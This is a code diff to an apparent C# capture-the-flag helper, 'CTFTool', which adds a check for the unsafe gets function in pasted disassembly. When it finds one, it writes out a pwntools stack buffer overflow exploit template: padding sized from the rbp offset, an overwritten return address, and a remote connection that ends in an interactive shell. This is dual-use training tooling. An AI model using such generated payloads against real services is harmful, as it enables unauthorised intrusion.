@@ -28,6 +28,7 @@ namespace CTFTool
         {
             Boolean bExec = false;
             bExec = bExec || PwnExistShellCode();
+            bExec = bExec || PwnExistGets();
             if (!bExec)
             {
                 m_cExp.Text = m_cExp.Text + "分析失败" + Environment.NewLine;
@@ -54,6 +55,42 @@ namespace CTFTool
                 else
                 {
                     m_cOut.Text += "process = remote('IP', Port)\n";
+                }
+                m_cOut.Text += "process.interactive()\n";
+
+                return true;
+            }
+            return false;
+        }
+
+        //存在gets函数
+        private Boolean PwnExistGets()
+        {
+            if (m_cIn.Text.Contains("gets"))
+            {
+                //说明
+                m_cExp.Text += "函数中存在漏洞函数gets!";
+
+                //输出
+                m_cOut.Text += "from pwn import *\n";
+                m_cOut.Text += "\n";
+                Regex vRegex = new Regex("(.*?):(\\d+)", RegexOptions.Multiline);
+                Match vMatch = vRegex.Match(m_cIn.Text);
+                if (vMatch.Success)
+                {
+                    m_cOut.Text += "process = remote('" + vMatch.Groups[1].Value + "', " + vMatch.Groups[2].Value + ")\n";
+                }
+                else
+                {
+                    m_cOut.Text += "process = remote('IP', Port)\n";
+                }
+                vRegex = new Regex("\\[rbp-(.*?)h\\]");
+                vMatch = vRegex.Match(m_cIn.Text);
+                if (vMatch.Success)
+                {
+                    m_cOut.Text += "payload = b'A'*(0x" + vMatch.Groups[1].Value + " + 0x8) + p64(Adress)\n";
+                    m_cOut.Text += "# payload = b'A'*(0x" + vMatch.Groups[1].Value + " + 0x8) + p64(Adress + 1)\n";
+                    m_cOut.Text += "process.sendline(payload)\n";
                 }
                 m_cOut.Text += "process.interactive()\n";
 
